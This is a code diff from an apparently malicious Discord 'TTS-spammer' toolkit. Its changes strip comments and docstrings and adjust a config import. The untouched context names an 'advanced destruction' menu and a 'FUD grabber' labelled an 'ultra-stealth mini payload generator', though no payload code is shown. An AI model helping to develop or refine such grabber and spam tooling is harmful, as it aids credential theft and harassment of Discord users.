@@ -28,14 +28,15 @@ GITHUB_REPO = "SellMeFish/TTS-spammer"
 RAW_VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/version.txt"
 LOCAL_VERSION_FILE = "version.txt"
 
-# Import strings configuration
 try:
-    from utils.config.strings_config import (
+    from utils.config import (
         CHANGELOG, MENU_HEADERS, MENU_CHOICES,
         PROMPTS, STATUS_MESSAGES, MESSAGES, UI_ELEMENTS, COLORS
     )
-except ImportError:
-    # Fallback if config file is not available
+    print("✓ Configuration loaded successfully")
+except ImportError as e:
+    print(f"Warning: Configuration not found, using fallback configuration")
+    print(f"Error details: {e}")
     CHANGELOG = ["v0.4.5 - Latest Update:", "✓ Configuration system added"]
     MENU_HEADERS = {}
     MENU_CHOICES = {}
@@ -165,7 +166,6 @@ def show_status():
 def print_banner(show_webhook=False, show_changelog=False):
     os.system('cls' if os.name == 'nt' else 'clear')
     
-    # Print banner first
     for idx, line in enumerate(BANNER):
         color = rgb(*RED_GRADIENT[idx % len(RED_GRADIENT)])
         banner_line = color + center(line) + RESET
@@ -183,7 +183,6 @@ def print_banner(show_webhook=False, show_changelog=False):
         print()
         show_webhook_box()
     
-    # Show changelog as separate block if requested
     if show_changelog:
         print_changelog_block()
     
@@ -1058,7 +1057,6 @@ def advanced_destruction_menu():
             break
 
 def fud_grabber_menu():
-    """FUD Grabber Menü - nur Mini Payload Generator"""
     print_banner(show_webhook=True)
     pretty_print(" FUD GRABBER", (255, 128, 0))
     pretty_print("Ultra-stealth Mini Payload Generator", (255, 64, 64))
@@ -1077,7 +1075,6 @@ def changelog_menu():
     input(rgb(255,32,32) + "Press enter to go back to main menu..." + RESET)
 
 def get_changelog_text():
-    """Get formatted changelog text"""
     version = get_local_version() or "Unknown"
     changelog_lines = []
     changelog_lines.append(f"📋 CHANGELOG - Version {version}")
@@ -1086,12 +1083,10 @@ def get_changelog_text():
     return changelog_lines
 
 def print_changelog_block():
-    """Print changelog as a left-aligned block like the main menu"""
     changelog_lines = get_changelog_text()
     print()
     
     for changelog_line in changelog_lines:
-        # Color the changelog line
         if changelog_line.startswith("📋"):
             colored_changelog = rgb(*COLORS.get("header", (255, 128, 0))) + changelog_line + RESET
         elif changelog_line.startswith("═"):
@@ -1105,7 +1100,6 @@ def print_changelog_block():
         else:
             colored_changelog = rgb(*COLORS.get("muted", (200, 200, 200))) + changelog_line + RESET
         
-        # Print left-aligned instead of centered
         print(colored_changelog)
     
     print()
@@ -1115,7 +1109,6 @@ def print_changelog_block():
 
 
 def discord_server_prompt():
-    """Ask user if they want to join the Discord server"""
     print_banner()
     pretty_print("🎮 JOIN OUR DISCORD SERVER", (255, 128, 0))
     print()
